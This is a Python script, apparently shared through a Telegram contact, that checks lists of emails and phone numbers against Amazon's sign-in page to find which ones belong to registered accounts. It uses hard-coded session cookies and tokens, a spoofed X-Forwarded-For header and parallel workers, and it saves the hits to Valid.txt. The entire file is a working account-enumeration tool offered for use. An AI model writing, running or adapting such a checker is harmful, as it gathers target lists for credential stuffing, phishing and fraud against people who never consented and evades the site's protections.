import requests,urllib3
from multiprocessing import Pool
requests.packages.urllib3.disable_warnings()
from colorama import init, Fore
import sys
init(autoreset=True)

red = Fore.RED
green = Fore.GREEN
white = Fore.WHITE
blue = Fore.BLUE
yellow = Fore.YELLOW
cyan = Fore.CYAN
background = white + green


class Amazon():
	def __init__(self,num):
		self.url  = "https://www.amazon.com/ap/signin"
		self.num = num
		self.redirect = None
		self.workflowState = None
		self.appActionToken = None
		self.openid = None
		self.prevRID = None
		
	def check(self):
		cookies = {"session-id": "138-6590535-4195843", 
        "session-id-time": "2360947702l", 
        "i18n-prefs": "USD", 
        "csm-hit": "tb:0WK72KKPV35HFT1ADWGC+s-TA27DS5KRYZDKRDFE8T8|1730227786835&t:1730227786835&adb:adblk_no", 
        "ubid-main": "135-5479552-5584549", 
        "session-token": "\"u/H5j0lWVkTbvItL7LNlpU/6GI/9l6AChXb5m5x+FrfxGfKcdItBBtwV+xAfXS+yYp8UL+aTsdfPN19pvUlq6d+aIwuwrjhl2dciRNI1uve8uVL2SqhwZFGn9G7jpz//RkSycmyMeBIrPRJixQY4utpCPNBq0ci/Q4qKzttckuRO8LhFjK2jFIdGHVfwSCFVXGqiCNHiOwPiCWQyaQkO3BdrnzOTW4aIVCLi2Z3q1Ogv9BKO4cs/T2HOVizsp6A0jaEVOZS20nUKNmtKLoaTtgymiXSp8Osjq1xgwfrriqRohiuiTPEwTapVWxwzYhsnwdIZliNlgMXP4UYRsy5blOLboh/DBCnf==\""}
		headers = {"User-Agent": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Mobile Safari/537.36", 
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", 
        "Accept-Language": "en-US,en;q=0.9", 
        "Accept-Encoding": "gzip, deflate, br, zstd,DNT,1",
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": "https://www.amazon.com", "Connection": "close", 
        "X-Forwarded-For": "127.0.0.1", 
        "Referer": "https://www.amazon.com/ap/signin?openid.pape.max_auth_age=0&amp;openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&amp;signInRedirectToFPPThreshold=5&amp;pageId=anywhere_us&amp;useSHuMAWorkflow=false&amp;openid.return_to=https%3A%2F%2Fwww.amazon.com%2F%3F%26tag%3Dgoogleglobalp-20%26ref%3Dnav_ya_signin%26adgrpid%3D159651196451%26hvpone%3D%26hvptwo%3D%26hvadid%3D675114638556%26hvpos%3D%26hvnetw%3Dg%26hvrand%3D7106314878355133947%26hvqmt%3De%26hvdev%3Dc%26hvdvcmdl%3D%26hvlocint%3D%26hvlocphy%3D9125012%26hvtargid%3Dkwd-10573980%26hydadcr%3D2246_13649807&amp;prevRID=FDHB1H34PQR1H99SGM56&amp;openid.assoc_handle=anywhere_v2_us&amp;openid.mode=checkid_setup&amp;prepopulatedLoginId=eyJjaXBoZXIiOiJZblZBVFNJTTh5Nyt1ckJjRG0rbVVTWlp1Wk9OcnNwZ0thR3d6ZndsOXQwPSIsIklWIjoiMkpzaHdLd3c3bW1udCtlWjlIWk1mQT09IiwidmVyc2lvbiI6MX0%3D&amp;failedSignInCount=0&amp;ref_=ap_pwd_change&amp;openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&amp;openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&amp;shouldShowPersistentLabels=true&amp;timestamp=1730229176000&",
        "Upgrade-Insecure-Requests": "1", "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-User": "?1"}
		data = {"appActionToken": "Bj2BQ3zWTJfxLvetxuj2FOav4zRHyXsj3D", 
        "appAction": "SIGNIN_PWD_COLLECT", 
        "subPageType": "SignInClaimCollect", 
        "openid.return_to": "ape:aHR0cHM6Ly93d3cuYW1hem9uLmNvbS8/cmVmXz1uYXZfeWFfc2lnbmlu", 
        "prevRID": "ape:QVExRkRNWFNORjVHUFEzQlY3Vkg=", 
        "workflowState": "eyJ6aXAiOiJERUYiLCJlbmMiOiJBMjU2R0NNIiwiYWxnIjoiQTI1NktXIn0.7R-99MSgG70rQSkPEiWZW5QCp2Uj_MereT7W1Wgtue69yWZVsANsSg.V_UiipUnVKvw8el0.B4SvPnXCVktGKL7TxFFxShJrOzpA9hVblTmPhoI60h0lchEfbaSYGeYhBYANPuglMTBe_kZSMAtdr8J1G30NOC7j-nDF9n2X92en49zUB1D-BzgQrDLSAaMYDMPYbehNoyx6yTUie7nDeUBLzrW7Sc1N-eCvD7fO2qEUL3xTHScWexW_0I0Zcgtx-YVDwdBcgXHfjKD37bQqSqaOqQjAJHlzo5ZXXq2NmONSMew44dsNQuBLVIKfadaRaZJbAYBV9v4MpH21LNXVufFbNSiKaiQUS16ctnk0wMtBoUmUEc6pXHVXhOImTDC5i9Z4qYn_EOsgesAuUoC83ldFkA2l-_VEMZVG-uA3EIDQVXE8CYgdaWtjqbRHRAOFeMnVpMjBcwVjmqYKDuotHrs8POlMIQIA_834sqNDxnUvo1F4FihMB-S2q3VLKVJTpy-andOpfP23zMSR33Ph7F4XxQ_P1EHDMy53rDY9ZryyHsPf__jIm3x2ZRvEscHIJepUeTvdIkFn2YnYJarc-ChiOIguR6fL_5eiXe344UoZwxNBSw.qjdAJ77X2rixLP_Z45zIgQ", 
        "email": self.num, "password": '',
        "create": "0",
        "metadata1": "ECdITeCs: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"}
		res = requests.post(self.url, headers=headers, cookies=cookies, data=data).text
		
		if "ap_change_login_claim" in res:
			return True,res
		elif "auth-error-message-box" in res:
			return False,res
		else:
			return False,res

class INDEx:
    def __new__(self):
        print(yellow + """
        Script Started - 
            script by @ta9ra9pa9
            modified by @iampopg
            contact https://t.me/iampopg
        """)

def fun_action(num):
    num = num.strip()
    
    # Ensure the number has the correct format
    if num.isnumeric() and "+" not in num:
        num = "+%s" % num
    elif "@" in num:
        pass  # Assuming valid email format; no action needed
    else:
        print(yellow + f"[?] Unknown Format ==> {num}")
        return  # Exit the function early if the format is unknown

    while True:
        try:
            # Call the check function to validate
            A, Error = Amazon(num).check()

            if A:
                with open("Valid.txt", "a") as ff:
                    ff.write("%s\n" % num)
                print(green + f"[+] Valid ==> {num}")
                break

            else:
                print(red + f"[-] Invalid ==> {num}")
                break

        except Exception as e:
            print(yellow + f"[?] Unknown Error ==> {num}")
            break

def main(input_file):
    for _ in range(1):  # Run the process three times
        try:
            email = open(input_file, "r", encoding="Latin-1").read().splitlines()
            ThreadPool = Pool(3)
            ThreadPool.map(fun_action, email)
        except Exception as e:
            print(e)

if __name__ == "__main__":
    INDEx()
    if len(sys.argv) != 2:
        print("Usage: python Amazon_action.py <input_file>")
        sys.exit(1)
    input_file = sys.argv[1]
    main(input_file)
